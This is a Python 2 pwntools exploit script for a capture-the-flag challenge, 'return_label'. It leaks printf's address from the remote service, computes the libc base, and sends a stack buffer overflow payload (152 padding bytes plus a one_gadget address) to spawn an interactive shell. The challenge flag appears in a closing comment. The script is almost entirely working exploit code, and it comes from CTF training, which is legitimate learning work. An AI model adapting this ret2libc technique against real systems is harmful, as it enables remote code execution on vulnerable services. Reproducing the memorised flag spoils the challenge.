#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host jh2i.com --port 50005 return_label
from pwn import *

# Set up pwntools for the correct architecture
libc = ELF('./libc-2.23.so')
exe = context.binary = ELF('return_label')
context.terminal = ['tmux', 'splitw', '-h']
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'jh2i.com'
port = int(args.PORT or 50005)

gdbscript = '''
    brva 0x83F
'''

def local(argv=[], *a, **kw):
    global gdbscript
    '''Execute the target binary locally'''
    if args.GDB:
        # return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
        p = process([exe.path])
        gdb.attach(p,gdbscript=gdbscript)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
# payload = cyclic(1024)
io.recvuntil("printf is at ")
printf = int(io.recvuntil(")",True),16)
libc.address = printf - libc.symbols['printf']
print hex(libc.address)
payload = "A"*152 + p64(libc.address+0x45216)
io.sendlineafter("\n\n", payload)


io.interactive()
# LLS{r0p_1s_fun}
